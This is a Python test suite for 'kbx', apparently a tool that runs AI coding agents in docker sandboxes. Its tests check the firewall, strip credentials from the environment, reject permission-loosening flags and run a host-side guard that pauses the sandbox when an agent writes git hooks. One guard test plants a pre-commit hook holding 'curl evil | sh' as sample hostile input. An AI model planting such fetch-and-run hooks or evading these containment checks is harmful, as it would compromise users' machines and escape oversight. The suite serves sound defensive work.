"""End to end through bin/kbx with the fake docker, under a pseudo-terminal."""

from __future__ import annotations

import json
import os
import pty
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

from tests.unit.helpers import KBX, TempHome
from tests.unit.helpers import git as run_git


class CliTest(TempHome):
    def setUp(self) -> None:
        super().setUp()
        self.repo = self.make_repo("myproj")
        self.add_image()
        self.addCleanup(self.stop_guards)

    def stop_guards(self) -> None:
        run_dir = self.home / ".local/share/kbx/run"
        for pid_file in [*run_dir.glob("guard-*.pid"), *run_dir.glob("watch-*.pid")]:
            try:
                os.kill(int(pid_file.read_text()), signal.SIGTERM)
            except (OSError, ValueError):
                pass

    def clone_mode(self) -> None:
        config = self.home / ".config/kbx/config.toml"
        config.parent.mkdir(parents=True, exist_ok=True)
        config.write_text('[workspace]\nmode = "clone"\n')

    def status(self) -> str:
        return self.docker_state()["containers"][self.sandbox_name()]["State"]["Status"]

    def wait_status(self, wanted: str, timeout: float = 15) -> None:
        deadline = time.monotonic() + timeout
        while self.status() != wanted:
            if time.monotonic() > deadline:
                self.fail(f"sandbox is {self.status()}, not {wanted}")
            time.sleep(0.1)

    def tty(
        self, *args: str, cwd: Path | None = None, env: dict[str, str] | None = None, answer: str = ""
    ) -> tuple[int, str]:
        master, slave = pty.openpty()
        full_env = dict(self.env)
        full_env.update(env or {})
        process = subprocess.Popen(
            [sys.executable, str(KBX), *args],
            stdin=slave,
            stdout=slave,
            stderr=slave,
            cwd=str(cwd or self.repo),
            env=full_env,
            close_fds=True,
        )
        os.close(slave)
        if answer:
            os.write(master, answer.encode())  # waits in the terminal until read
        chunks: list[bytes] = []
        while True:
            try:
                data = os.read(master, 65536)
            except OSError:
                break
            if not data:
                break
            chunks.append(data)
        os.close(master)
        status = process.wait(timeout=60)
        return status, b"".join(chunks).decode("utf-8", "replace").replace("\r\n", "\n")

    def attached(self) -> dict[str, Any]:
        path = self.state_dir / "attached.json"
        self.assertTrue(path.exists(), "nothing was attached")
        return json.loads(path.read_text())

    def exec_calls(self) -> list[list[str]]:
        return [c for c in self.calls() if c[:1] == ["exec"]]

    def sandbox_name(self) -> str:
        return next(iter(self.docker_state()["containers"]))

    def test_first_launch_claude(self) -> None:
        self.clone_mode()
        status, output = self.tty("claude", "--resume")
        self.assertEqual(status, 0, output)
        self.assertIn("fake-attached", output)
        attached = self.attached()
        self.assertEqual(attached["herdr"], "claude")
        self.assertEqual(
            attached["argv"],
            [
                "dtach",
                "-A",
                "/run/kbx/sessions/claude.sock",
                "-e",
                "^\\",
                "-r",
                "winch",
                "claude",
                "--resume",
                "--remote-control",
            ],
        )
        final = self.exec_calls()[-1]
        self.assertEqual(final[:3], ["exec", "-i", "-t"])
        self.assertIn("DISPLAY=:0", final)
        self.assertEqual(final[final.index("-w") + 1], "/home/agent/work/myproj")
        self.assertTrue((self.sandbox_home / "work" / "myproj" / "README.md").exists(), "clone seeded")
        joined = [" ".join(c) for c in self.exec_calls()]
        self.assertTrue(any("claude update" in c for c in joined), "auto-update ran")
        self.assertTrue(any("kbx-seed --only-prefix .claude/" in c for c in joined))
        self.assertTrue(any(c.endswith("kbx-onboard claude /home/agent/work/myproj") for c in joined))
        self.assertTrue(any("sys.exit(0 if exc.errno" in c for c in joined), "firewall probe ran")
        self.assertTrue((self.home / ".local/share/kbx/stage/config.json").exists())
        self.assertIn("Detach with Ctrl-\\", output)

    def test_reattach_skips_update_and_prelaunch(self) -> None:
        self.tty("claude")
        self.clear_calls()
        self.behave(sessions=["claude"])
        status, output = self.tty("claude", "--ignored")
        self.assertEqual(status, 0, output)
        self.assertIn("Reattaching", output)
        self.assertEqual(self.attached()["argv"][:2], ["dtach", "-a"])
        joined = [" ".join(c) for c in self.exec_calls()]
        self.assertFalse(any("update" in c for c in joined))
        self.assertFalse(any("kbx-seed" in c for c in joined))

    def test_firewall_missing_refuses_to_attach(self) -> None:
        self.behave(firewall=3)
        status, output = self.tty("claude")
        self.assertEqual(status, 1)
        self.assertIn("host firewall is not active", output)
        self.assertFalse((self.state_dir / "attached.json").exists())

    def test_update_failure_still_launches(self) -> None:
        self.behave(update_status=1)
        status, output = self.tty("pi")
        self.assertEqual(status, 0, output)
        self.assertIn("pi update failed", output)
        self.assertEqual(self.attached()["argv"][-1], "pi")

    def test_skip_onboarding_off(self) -> None:
        self.tty("claude", env={"KBX_SKIP_ONBOARDING": "false"})
        self.assertFalse(any("kbx-onboard" in " ".join(c) for c in self.exec_calls()))

    def test_pi_has_no_onboarding_step(self) -> None:
        self.tty("pi")
        self.assertFalse(any("kbx-onboard" in " ".join(c) for c in self.exec_calls()))

    def test_auto_update_off(self) -> None:
        self.tty("pi", env={"KBX_AUTO_UPDATE": "false"})
        joined = [" ".join(c) for c in self.exec_calls()]
        self.assertFalse(any("npm install" in c for c in joined))

    def test_codex_prelaunch(self) -> None:
        config = self.home / ".config/kbx/config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[modules]\ncodex-reset-fast = true\n")
        status, output = self.tty("codex")
        self.assertEqual(status, 0, output)
        joined = [" ".join(c) for c in self.exec_calls()]
        self.assertTrue(any(c.endswith("kbx-init run-start codex-reset-fast") and "-u agent" in c for c in joined))
        self.assertTrue(any("codex remote-control start" in c for c in joined))
        argv = self.attached()["argv"]
        self.assertIn("forced_login_method=chatgpt", argv)
        self.assertIn("--search", argv)

    def test_codex_not_logged_in(self) -> None:
        self.behave(codex_login=False)
        status, output = self.tty("codex")
        self.assertEqual(status, 0, output)
        self.assertIn("codex login --device-auth", output)
        self.assertFalse(any("remote-control start" in " ".join(c) for c in self.exec_calls()))

    def test_login_hint_and_session_marker(self) -> None:
        self.behave(logins={"claude": {"ok": False, "detail": "not logged in"}})
        status, output = self.tty("claude")
        self.assertEqual(status, 0, output)
        self.assertIn("claude is not logged in: type /login in Claude", output)
        self.assertIn("KBX_SESSION=claude", self.exec_calls()[-1])
        self.clear_calls()
        self.behave(logins={}, sessions=[])
        status, output = self.tty("pi")
        self.assertNotIn("not logged in", output)

    def test_watcher_notifies_when_detached(self) -> None:
        sent = self.temp / "notify-send.log"
        fake = self.temp / "bin" / "notify-send"
        fake.write_text(f'#!/bin/sh\nprintf "%s|" "$@" >> {sent}\necho >> {sent}\n')
        fake.chmod(0o755)
        events = [
            {"type": "sessions", "sessions": {"claude": {"attached": False}}},
            {"type": "event", "agent": "claude", "state": "working", "message": "", "attached": False},
            {"type": "event", "agent": "claude", "state": "done", "message": "All <b>tests</b> pass", "attached": True},
            {"type": "event", "agent": "claude", "state": "waiting", "message": "-u critical", "attached": False},
            {"type": "event", "agent": "evil", "state": "done", "message": "x", "attached": False},
        ]
        self.behave(follow=events)
        status, output = self.tty("claude", env={"KBX_NOTIFY": "detached"})
        self.assertEqual(status, 0, output)
        deadline = time.monotonic() + 20
        while not sent.exists() and time.monotonic() < deadline:
            time.sleep(0.1)
        time.sleep(0.5)
        lines = sent.read_text().splitlines()
        # Only the detached "waiting" event; the text stays an argument after `--`.
        self.assertEqual(lines, ["-a|kbx|-u|normal|--|claude needs you · myproj|-u critical|"])
        pid = int((self.home / ".local/share/kbx/run" / f"watch-{self.sandbox_name()}.pid").read_text())
        self.assertIn(b"_watch", Path(f"/proc/{pid}/cmdline").read_bytes())

    def test_diff(self) -> None:
        self.clone_mode()
        result = self.run_kbx("diff", cwd=self.repo)
        self.assertEqual(result.returncode, 1)
        self.assertIn("no sandbox for this project", result.stderr)

    def fake_host_tools(self) -> Path:
        """bwrap and socat stand-ins, and kbx's own Claude as a recorder of argv, cwd and environment.
        A `claude` on PATH must never run."""
        record = self.temp / "host-claude.json"
        bin_dir = self.temp / "bin"
        copy = self.home / ".local/share/kbx/host-claude-bin/1.0.0/claude"
        copy.parent.mkdir(parents=True)
        (copy.parent.parent / "current").write_text("1.0.0\n")
        copy.write_text(
            f"#!{sys.executable}\nimport json, os, sys\n"
            f"open({str(record)!r}, 'w').write(json.dumps({{'argv': sys.argv, 'cwd': os.getcwd(), 'env': dict(os.environ)}}))\n"
        )
        (bin_dir / "claude").write_text("#!/bin/sh\necho WRONG CLAUDE; exit 3\n")
        for name in ("bwrap", "socat"):
            (bin_dir / name).write_text("#!/bin/sh\nexit 0\n")
        for path in (copy, bin_dir / "claude", bin_dir / "bwrap", bin_dir / "socat"):
            path.chmod(0o755)
        return record

    def test_host_asks_first(self) -> None:
        record = self.fake_host_tools()
        status, output = self.tty("host", answer="n\n", env={"KBX_AUTO_UPDATE": "false"})
        self.assertEqual(status, 1, output)
        self.assertIn("outside any VM", output)
        self.assertIn("Not started.", output)
        self.assertFalse(record.exists())
        result = self.run_kbx("host", cwd=self.repo)
        self.assertEqual(result.returncode, 1)
        self.assertIn("needs a terminal", result.stderr)

    def test_host_launches_locked_down(self) -> None:
        record = self.fake_host_tools()
        env = {"GITHUB_TOKEN": "secret", "SSH_AUTH_SOCK": "/run/agent.sock", "KBX_AUTO_UPDATE": "false"}
        (self.repo / "sub").mkdir()
        status, output = self.tty(
            "host", "-c", "--model", "opus", "fix the build", cwd=self.repo / "sub", env=env, answer="y\n"
        )
        self.assertEqual(status, 0, output)
        self.assertNotIn("WRONG CLAUDE", output)
        ran = json.loads(record.read_text())
        self.assertEqual(ran["argv"][0], str(self.home / ".local/share/kbx/host-claude-bin/1.0.0/claude"))
        argv = ran["argv"][1:]
        self.assertEqual(argv[:4], ["--restricted", "--tools", "Bash,Read,Edit,Write,Glob,Grep", "--strict-mcp-config"])
        self.assertEqual(argv[argv.index("--permission-mode") + 1], "manual")
        self.assertEqual(argv[-5:], ["--continue", "--model", "opus", "--", "fix the build"])
        self.assertEqual(ran["cwd"], str(self.repo))
        self.assertNotIn("GITHUB_TOKEN", ran["env"])
        self.assertNotIn("SSH_AUTH_SOCK", ran["env"])
        self.assertEqual(ran["env"]["DISABLE_AUTOUPDATER"], "1", "the copy must never install itself")
        state = Path(ran["env"]["CLAUDE_CONFIG_DIR"])
        self.assertEqual(state, self.home / ".local/share/kbx/host-claude")
        self.assertTrue(json.loads((state / ".claude.json").read_text())["hasCompletedOnboarding"])
        settings = json.loads(Path(argv[argv.index("--settings") + 1]).read_text())
        self.assertIn(str(self.repo / ".git"), settings["sandbox"]["filesystem"]["denyWrite"])
        self.assertEqual(settings["sandbox"]["filesystem"]["denyRead"][0], str(self.home))

    def test_host_rejects_loosening_flags(self) -> None:
        self.fake_host_tools()
        for flag in ("--dangerously-skip-permissions", "--settings", "--add-dir"):
            result = self.run_kbx("host", flag, "x", cwd=self.repo)
            self.assertEqual(result.returncode, 2, flag)

    def test_not_a_git_repository(self) -> None:
        plain = self.temp / "plain"
        plain.mkdir()
        result = self.run_kbx("claude", cwd=plain)
        self.assertEqual(result.returncode, 1)
        self.assertIn("git init && git commit --allow-empty -m init", result.stderr)
        self.assertEqual(self.docker_state()["containers"], {})

    def test_missing_image(self) -> None:
        state = self.docker_state()
        state["images"] = {}
        self.write_state(state)
        result = self.run_kbx("shell", cwd=self.repo)
        self.assertEqual(result.returncode, 1)
        self.assertIn("kbx build", result.stderr)

    def test_attach(self) -> None:
        result = self.run_kbx("attach", cwd=self.repo)
        self.assertIn("no sandbox", result.stderr)
        self.tty("claude")
        self.behave(sessions=[])
        self.assertIn("no running sessions", self.run_kbx("attach", cwd=self.repo).stderr)
        self.behave(sessions=["claude", "codex"])
        self.assertIn("several sessions", self.run_kbx("attach", cwd=self.repo).stderr)
        self.behave(sessions=["codex"])
        status, output = self.tty("attach")
        self.assertEqual(status, 0, output)
        self.assertEqual(self.attached()["argv"][:3], ["dtach", "-a", "/run/kbx/sessions/codex.sock"])

    def test_attach_needs_a_terminal(self) -> None:
        self.tty("claude")
        self.behave(sessions=["claude"])
        result = self.run_kbx("attach", "claude", cwd=self.repo)
        self.assertEqual(result.returncode, 1)
        self.assertIn("needs a terminal", result.stderr)

    def test_shell(self) -> None:
        status, output = self.tty("shell")
        self.assertEqual(status, 0, output)
        self.assertEqual(self.attached()["argv"], ["bash", "-l"])

    def test_rm_asks_and_lists_unfetched(self) -> None:
        self.clone_mode()
        self.tty("claude")
        clone = self.sandbox_home / "work" / "myproj"
        sandbox_env = {k: v for k, v in os.environ.items() if k != "GIT_CONFIG_GLOBAL"}
        sandbox_env["HOME"] = str(self.sandbox_home)
        run_git(clone, "checkout", "-q", "-b", "agent-work", env=sandbox_env)
        (clone / "x.txt").write_text("x")
        run_git(clone, "add", "x.txt", env=sandbox_env)
        run_git(clone, "commit", "-q", "-m", "x", env=sandbox_env)
        name = self.sandbox_name()
        result = self.run_kbx("rm", cwd=self.repo)
        self.assertEqual(result.returncode, 1)
        self.assertIn("agent-work  (1 commit(s))", result.stdout)
        self.assertIn("Nothing deleted", result.stdout)
        self.assertIn(name, self.docker_state()["containers"])
        self.assertIn(f"{name}-home", self.docker_state()["volumes"])
        result = self.run_kbx("rm", "--yes", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.docker_state()["containers"], {})
        self.assertNotIn(f"{name}-home", self.docker_state()["volumes"])

    def test_stop_and_recreate_keep_volumes(self) -> None:
        self.tty("claude")
        name = self.sandbox_name()
        self.assertEqual(self.run_kbx("stop", cwd=self.repo).returncode, 0)
        self.assertEqual(self.docker_state()["containers"][name]["State"]["Status"], "exited")
        result = self.run_kbx("recreate", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.docker_state()["containers"][name]["State"]["Status"], "created")
        self.assertIn(f"{name}-home", self.docker_state()["volumes"])
        self.assertFalse(any(c[:2] == ["volume", "rm"] for c in self.calls()))

    def test_fetch_and_sync(self) -> None:
        self.clone_mode()
        self.tty("claude")
        result = self.run_kbx("sync", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        result = self.run_kbx("fetch", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("kbx/main", result.stdout)

    def test_ls(self) -> None:
        self.assertIn("No kbx sandboxes", self.run_kbx("ls").stdout)
        self.tty("claude")
        self.behave(sessions=["claude"])
        out = self.run_kbx("ls").stdout
        self.assertIn("running", out)
        self.assertIn("claude", out)
        self.assertIn(str(self.repo), out)

    def test_build_and_drift(self) -> None:
        result = self.run_kbx("build")
        self.assertEqual(result.returncode, 0, result.stderr)
        dockerfile = (self.state_dir / "Dockerfile.last").read_text()
        self.assertIn("# --- module: clipboard (builtin) ---", dockerfile)
        labels = self.docker_state()["images"]["kbx-agent"]["Config"]["Labels"]
        self.assertIn("kbx.modules-hash", labels)
        self.assertIn("kbx.module.clipboard", labels)
        config = self.home / ".config/kbx/config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[modules]\nplaywright = true\n")
        status, output = self.tty("shell")
        self.assertEqual(status, 0, output)
        self.assertIn("module playwright was enabled; run `kbx build && kbx recreate`", output)
        print_result = self.run_kbx("build", "--print")
        self.assertIn("module: playwright", print_result.stdout)

    def test_check(self) -> None:
        result = self.run_kbx("check")
        self.assertEqual(result.returncode, 0, result.stdout)
        self.assertIn("[on ] clipboard", result.stdout)
        self.assertIn("[off] playwright", result.stdout)
        config = self.home / ".config/kbx/config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[modules]\nnope = true\n")
        result = self.run_kbx("check")
        self.assertEqual(result.returncode, 1)
        self.assertIn("unknown module", result.stdout)

    def test_seed_command(self) -> None:
        self.tty("claude")
        self.assertEqual(self.run_kbx("seed", "--status", cwd=self.repo).returncode, 0)
        result = self.run_kbx("seed", "--reset", "codex-chatgpt-auth", cwd=self.repo)
        self.assertEqual(result.returncode, 1, "reset needs confirmation")
        result = self.run_kbx("seed", "--reset", "codex-chatgpt-auth", "--yes", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertTrue(any(c[-3:] == ["kbx-seed", "--reset", "codex-chatgpt-auth"] for c in self.calls()))

    def test_clipboard_tools_missing_warns_once(self) -> None:
        _, first = self.tty("claude", env={"PATH": self.env["PATH"]})
        self.assertIn("image paste is off", first)
        _, second = self.tty("claude")
        self.assertNotIn("image paste is off", second)

    def test_errors_are_one_line(self) -> None:
        config = self.home / ".config/kbx/config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[launcher]\ncpus = -1\n")
        result = self.run_kbx("ls")
        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stderr.strip().count("\n"), 0, result.stderr)
        self.assertNotIn("Traceback", result.stderr)
        result = self.run_kbx("ls", extra_env={"KBX_DEBUG": "1"})
        self.assertIn("Traceback", result.stderr)

    def test_start_without_attaching(self) -> None:
        self.clone_mode()
        result = self.run_kbx("start", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("is running", result.stdout)
        self.assertTrue((self.sandbox_home / "work" / "myproj" / ".git").is_dir())
        self.assertFalse((self.state_dir / "attached.json").exists())


class MountModeTest(CliTest):
    """The default: the checkout is shared, and the host-side guard watches it."""

    def create_args(self) -> list[str]:
        return self.docker_state()["containers"][self.sandbox_name()]["Args"]

    def test_first_launch_mounts_the_checkout(self) -> None:
        status, output = self.tty("claude")
        self.assertEqual(status, 0, output)
        args = self.create_args()
        self.assertIn(f"type=bind,source={self.repo},target={self.repo}", args)
        self.assertIn("kbx.workspace=mount", args)
        self.assertIn(f"KBX_HOST_UID={os.getuid()}", args)
        final = self.exec_calls()[-1]
        self.assertEqual(final[final.index("-w") + 1], str(self.repo))
        self.assertFalse((self.sandbox_home / "work" / "myproj").exists(), "no clone in mount mode")
        self.assertIn("own checkout", (self.sandbox_home / "work" / "KBX.md").read_text())
        pid = int((self.home / ".local/share/kbx/run" / f"guard-{self.sandbox_name()}.pid").read_text())
        self.assertIn(b"_guard", Path(f"/proc/{pid}/cmdline").read_bytes())
        result = self.run_kbx("fetch", cwd=self.repo)
        self.assertEqual(result.returncode, 1)
        self.assertIn("not needed in mount mode", result.stderr)

    def test_diff_runs_git_in_the_sandbox(self) -> None:
        self.assertEqual(self.run_kbx("start", cwd=self.repo).returncode, 0)
        run_git(self.repo, "commit", "-q", "--allow-empty", "-m", "agent commit")
        (self.repo / "README.md").write_text("hello\nchanged\n")
        (self.repo / "new.txt").write_text("\x1b[8mhidden\x1b[0m\n")
        (self.repo / "sub").mkdir()
        (self.repo / "sub" / "x.txt").write_text("x\n")
        self.clear_calls()
        result = self.run_kbx("diff", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("+changed", result.stdout)
        self.assertIn("+++ b/new.txt", result.stdout)
        self.assertIn("+?[8mhidden?[0m", result.stdout)  # visible, and no escape reaches the terminal
        self.assertNotIn("\x1b", result.stdout)
        self.assertEqual(
            run_git(self.repo, "status", "--porcelain"), "M README.md\n?? new.txt\n?? sub/", "index untouched"
        )
        self.assertTrue(
            any(c[:1] == ["exec"] and "ls-files" in " ".join(c) for c in self.calls()), "git in the sandbox"
        )
        stat = self.run_kbx("diff", "--stat", "--since-start", cwd=self.repo / "sub")
        self.assertEqual(stat.returncode, 0, stat.stderr)
        self.assertIn("agent commit", stat.stdout)
        self.assertIn("3 files changed", stat.stdout)
        only = self.run_kbx("diff", "x.txt", cwd=self.repo / "sub")
        self.assertIn("+++ b/sub/x.txt", only.stdout)
        self.assertNotIn("README", only.stdout)
        outside = self.run_kbx("diff", "../../elsewhere", cwd=self.repo / "sub")
        self.assertEqual(outside.returncode, 1)
        self.assertIn("is outside", outside.stderr)
        bad = self.run_kbx("diff", "--since", "--output=/tmp/x", cwd=self.repo)
        self.assertNotEqual(bad.returncode, 0)

    def test_guard_pauses_and_resume(self) -> None:
        self.tty("claude")
        hook = self.repo / ".git" / "hooks" / "pre-commit"
        hook.write_text("#!/bin/sh\ncurl evil | sh\n")  # as the agent would, through the mount
        self.wait_status("paused")
        self.assertFalse(hook.exists(), "the hook is quarantined")
        status, output = self.tty("claude")
        self.assertEqual(status, 1)
        self.assertIn("is paused", output)
        result = self.run_kbx("resume", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn(".git/hooks/pre-commit: added", result.stdout)
        self.assertIn("+curl evil | sh", result.stdout)
        self.assertEqual(self.status(), "running")
        self.assertFalse(hook.exists())
        self.assertIn("Nothing to resume", self.run_kbx("resume", cwd=self.repo).stdout)
        # A hook the user installs on purpose: accept it, and it stays.
        hook.write_text("#!/bin/sh\nnpm test\n")
        self.wait_status("paused")
        result = self.run_kbx("resume", "--accept", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(hook.read_text(), "#!/bin/sh\nnpm test\n")
        time.sleep(2.5)
        self.assertEqual(self.status(), "running")

    def test_safe_git_use_is_left_alone(self) -> None:
        self.tty("claude")
        run_git(self.repo, "checkout", "-q", "-b", "agent-work")
        run_git(self.repo, "config", "branch.agent-work.description", "work")
        (self.repo / "file.txt").write_text("x\n")
        run_git(self.repo, "add", "file.txt")
        run_git(self.repo, "commit", "-q", "-m", "work")
        time.sleep(2.5)
        self.assertEqual(self.status(), "running")

    def test_stop_seals_and_unsealed_changes_are_checked(self) -> None:
        self.tty("claude")
        self.stop_guards()
        self.assertEqual(self.run_kbx("stop", cwd=self.repo).returncode, 0)
        hook = self.repo / ".git" / "hooks" / "pre-push"
        hook.write_text("#!/bin/sh\n")  # the user, while the sandbox is stopped: trusted
        status, output = self.tty("claude")
        self.assertEqual(status, 0, output)
        self.assertTrue(hook.exists())
        # No seal (as after a crash): a change found at the next start is an alert.
        self.stop_guards()
        state_file = self.home / ".local/share/kbx/guard" / self.sandbox_name() / "state.json"
        state = self.docker_state()  # the container stops without kbx
        state["containers"][self.sandbox_name()]["State"]["Status"] = "exited"
        self.write_state(state)
        hook.write_text("#!/bin/sh\nevil\n")
        self.assertFalse(json.loads(state_file.read_text())["sealed"])
        status, output = self.tty("claude")
        self.assertEqual(status, 1)
        self.assertIn("kbx resume", output)
        self.assertEqual(hook.read_text(), "#!/bin/sh\n")

    def test_linked_worktree_mounts_its_repository(self) -> None:
        worktree = self.temp / "wt"
        run_git(self.repo, "worktree", "add", "-q", str(worktree))
        result = self.run_kbx("start", cwd=worktree)
        self.assertEqual(result.returncode, 0, result.stderr)
        name = next(n for n, c in self.docker_state()["containers"].items() if f"kbx.project={worktree}" in c["Args"])
        args = self.docker_state()["containers"][name]["Args"]
        self.assertIn(f"type=bind,source={worktree},target={worktree}", args)
        self.assertIn(f"type=bind,source={self.repo}/.git,target={self.repo}/.git", args)
        self.assertNotIn(f"type=bind,source={self.repo},target={self.repo}", args)
        (self.repo / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\nevil\n")
        deadline = time.monotonic() + 15
        while self.docker_state()["containers"][name]["State"]["Status"] != "paused":
            self.assertLess(time.monotonic(), deadline, "the guard did not pause the worktree's sandbox")
            time.sleep(0.1)
        self.assertFalse((self.repo / ".git" / "hooks" / "post-checkout").exists())
        result = self.run_kbx("resume", cwd=worktree)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn(f"{self.repo}/.git/hooks/post-checkout: added", result.stdout)

    def test_rm_leaves_the_checkout(self) -> None:
        self.tty("claude")
        name = self.sandbox_name()
        result = self.run_kbx("rm", "--yes", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("is not touched", result.stdout)
        self.assertEqual(self.docker_state()["containers"], {})
        self.assertFalse((self.home / ".local/share/kbx/guard" / name).exists())
        self.assertTrue((self.repo / "README.md").exists())

    def test_recreate_switches_mode(self) -> None:
        self.clone_mode()
        self.tty("claude")
        self.assertIn("kbx.workspace=clone", self.create_args())
        (self.home / ".config/kbx/config.toml").write_text("")
        _, output = self.tty("shell")
        self.assertIn("created in clone mode", output)
        result = self.run_kbx("recreate", cwd=self.repo)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("in mount mode", result.stdout)
        self.assertIn("kbx.workspace=mount", self.create_args())
